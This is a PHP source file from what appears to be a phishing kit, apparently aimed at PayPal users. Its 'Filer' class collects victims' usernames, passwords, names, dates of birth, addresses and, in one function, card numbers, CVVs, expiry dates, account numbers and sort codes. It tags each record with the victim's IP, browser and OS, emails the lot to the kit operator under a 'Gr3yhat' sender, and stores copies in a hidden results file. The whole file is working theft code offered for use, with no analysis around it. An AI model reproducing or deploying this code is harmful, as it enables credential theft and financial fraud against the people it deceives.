<?php 



class Filer{
    //
    // private $saveonhost = 1;
    //
    function fileItem($uid, $pid, $fna, $dow, $phone, $addy, $cittt, $posss)
    {
        //start filing
require "../auth/conn.php";


$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$type =  $_SESSION['btype'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = $this->os_info($useragent);
$browser = $this->browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:Gr3yhat <Gr3yhatinc>";
$subj = "DATA from pp - $uid - $os";
$data = "
==============================
|username: $uid
|password: $pid
|fullname: $fna
|dob: $dow
|phone: $phone
|address: $addy
|city: $cittt
|postcode: $posss
=========================================
+ Victim Information
$VictimInfo
| Received : $date @ $time
============================================

";


    mail($to,$subj,$data,$headers); 
        //
        if($saveonhost == 1){
$fp = fopen('../rezultz.js', 'a');
fwrite($fp, $data);
fclose($fp);
}
        //
    header("location: ../inc.php");
}

function fileItem_t($uid, $pid, $fna, $dow, $phone, $addy, $cittt, $posss, $cpun, $cxpun, $cvpun, $acpun, $sopun)
    {
        //start filing
require "../auth/conn.php";


$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$type =  $_SESSION['btype'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = $this->os_info($useragent);
$browser = $this->browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:Gr3yhat <Gr3yhatinc>";
$subj = "DATA from pp - $uid - $os";
$data = "
==============================
|username: $uid
|password: $pid
|fullname: $fna
|dob: $dow
|phone: $phone
|address: $addy
|city: $cittt
|postcode: $posss
|ccno:$cpun
|ccexp:$cxpun
|cvv: $cvpun
|acc: $acpun
|sortcode:$sopun
=========================================
+ Victim Information
$VictimInfo
| Received : $date @ $time
============================================

";


    mail($to,$subj,$data,$headers); 
        //
        if($saveonhost == 1){
$fp = fopen('../rezultz.js', 'a');
fwrite($fp, $data);
fclose($fp);
}
        //
    header("location: ../complete.php");
}


 function fileItem_u1($uid, $pid)
    {
        //start filing

require "../auth/conn.php";

$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$type =  $_SESSION['btype'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = $this->os_info($useragent);
$browser = $this->browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:Gr3yhat <Gr3yhatinc>";
$subj = "DATA from pp - $uid - $os";
$data = "
==============================
|username: $uid
|password: $pid
=========================================
+ Victim Information
$VictimInfo
| Received : $date @ $time
============================================

";


    
    mail($to,$subj,$data,$headers); 
    //

if($saveonhost == 1){
$fp = fopen('../rezultz.js', 'a');
fwrite($fp, $data);
fclose($fp);
}
        //
    //header("location: ../complete.php");
    return 1;
}




//
function get_ua()
{
    global $list_ua;
    $list = explode("\n", $list_ua);
    $num = count($list) - 1;
    return trim($list[rand(0, $num)]);
}

//
function browsername()
{
    $browserName = $_SERVER['HTTP_USER_AGENT'];

    if (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")) {
        $browserName = "Opera";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "chrome/")) {
        $browserName = "Chrome";
    } elseif (strpos(strtolower($browserName), "msie")) {
        $browserName = "Internet Explorer";
    } elseif (strpos(strtolower($browserName), "firefox/")) {
        $browserName = "Firefox";
    } elseif (strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")==false and strpos(strtolower($browserName), "chrome/")==false) {
        $browserName = "Safari";
    } else { $browserName = "Unknown"; }

    return $browserName;
}


function os_info($uagent)
{
    // the order of this array is important
    global $uagent;
    $oses   = array(
        'Win311' => 'Win16',
        'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
        'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
        'Win98' => '(Windows 98)|(Win98)',
        'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
        'WinXP' => '(Windows NT 5.1)|(Windows XP)',
        'WinServer2003' => '(Windows NT 5.2)',
        'WinVista' => '(Windows NT 6.0)',
        'Windows 7' => '(Windows NT 6.1)',
        'Windows 8' => '(Windows NT 6.2)',
        'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'OpenBSD' => 'OpenBSD',
        'SunOS' => 'SunOS',
        'Ubuntu' => 'Ubuntu',
        'Android' => 'Android',
        'Linux' => '(Linux)|(X11)',
        'iPhone' => 'iPhone',
        'iPad' => 'iPad',
        'MacOS' => '(Mac_PowerPC)|(Macintosh)',
        'QNX' => 'QNX',
        'BeOS' => 'BeOS',
        'OS2' => 'OS/2',
        'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
    );
    $uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);
    foreach ($oses as $os => $pattern)
        if (preg_match('/' . $pattern . '/i', $uagent))
            return $os;
    return 'Unknown';
}

function systemInfo($ipAddress) {
    $systemInfo = array();

    $ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ipAddress), true);
    $systemInfo['city'] = $ipDetails['geoplugin_city'];
    $systemInfo['region'] = $ipDetails['geoplugin_region'];
    $systemInfo['country'] = $ipDetails['geoplugin_countryName'];

    $systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    $systemInfo['os'] = $this->os_info($systemInfo['useragent']);
    $systemInfo['browser'] = $this->browsername();

    return $systemInfo;
}
}